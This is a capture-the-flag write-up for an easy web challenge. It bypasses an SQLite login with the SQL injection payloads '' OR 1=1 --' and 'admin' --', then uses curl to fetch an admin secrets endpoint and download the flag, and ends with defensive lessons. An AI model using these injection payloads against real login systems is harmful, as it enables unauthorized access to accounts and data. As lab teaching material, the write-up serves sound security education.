# SQLi Basics — Writeup

## Challenge Overview

**Category:** Web  
**Difficulty:** Easy  
**Description:** SecureVault™ Employee Portal — "Log in to access the vault."

The challenge presents a simple login page. The goal is to bypass authentication via SQL injection, access the admin panel, and download `flag.zip`.

---

## Reconnaissance

Visiting the challenge URL shows a login form with `username` and `password` fields. There's nothing else visible — no register link, no password-reset, no hints on the page itself.

Trying random credentials returns **"Invalid credentials."**, while submitting a single quote (`'`) in the username field causes a **500 error** with a leaked SQLite error message:

```
SQLITE_ERROR: near "''": syntax error
```

This immediately confirms:
1. The backend uses **SQLite**.
2. User input is **concatenated directly into the SQL query** (no parameterized statements).

---

## Step 1 — Bypassing the Login (SQL Injection)

The vulnerable query on the server looks like:

```sql
SELECT * FROM users WHERE username = '<input>' AND password = '<input>'
```

### The Classic Bypass

In the **username** field, enter:

```
' OR 1=1 --
```

In the **password** field, enter anything (e.g. `x`).

This transforms the query into:

```sql
SELECT * FROM users WHERE username = '' OR 1=1 --' AND password = 'x'
```

- `OR 1=1` makes the `WHERE` clause always true.
- `--` comments out the rest of the query (the password check).
- The database returns the **first row** in the `users` table.

If the first row is the `guest` user, you'll log in as guest — not admin. To target admin specifically:

```
admin' --
```

This produces:

```sql
SELECT * FROM users WHERE username = 'admin' --' AND password = 'x'
```

The password check is commented out entirely, and you log in as **admin**.

### Using curl

The server uses **session cookies** for authorization, so you must save and reuse cookies across requests:

```bash
curl -s -X POST http://<host>:3000/api/login \
  -H "Content-Type: application/json" \
  -d '{"username": "admin'\'' --", "password": "x"}' \
  -c cookies.txt
```

Response:

```json
{
  "message": "Welcome, admin!",
  "role": "admin",
  "id": 2
}

```

---

## Step 2 — Accessing the Admin Panel

Once logged in as admin, the server stores `role=admin` in your session. The page automatically fetches `/api/secrets` (authenticated via the session cookie) and displays the secrets table:

| Name       | Value            |
|------------|------------------|
| flag_path  | `/download/flag` |

A download link appears: **⬇ Download flag.zip**

### Manual fetch

```bash
curl -s "http://<host>:3000/api/secrets" -b cookies.txt
```

```json
{
  "secrets": [
    { "name": "flag_path", "value": "/download/flag" }
  ]
}
```

> **Note:** Accessing `/api/secrets` without a valid admin session returns `403 Admin access required.`

---

## Step 3 — Downloading the Flag

```bash
curl -O "http://<host>:3000/download/flag" -b cookies.txt
```

This downloads `flag.zip`. Open/extract it for the flag.

> **Note:** Accessing `/download/flag` without a valid admin session returns `403 Admin access required. Log in first.`

---

## Summary of Payloads

| Step | Field    | Payload          | Purpose                     |
|------|----------|------------------|------------------------------|
| 1    | Username | `admin' --`      | Bypass password check        |
| 1    | Password | _(anything)_     | Ignored due to `--` comment  |
| 2    | URL      | `/api/secrets`   | Fetch admin secrets (session-gated) |
| 3    | URL      | `/download/flag` | Download the flag (session-gated)   |

## Key Takeaways

- **Never concatenate user input into SQL queries.** Use parameterized / prepared statements.
- **Error messages should not leak internal details** (e.g., database type, query structure).
- **Authorization should be server-side**, not based on client-supplied role values.
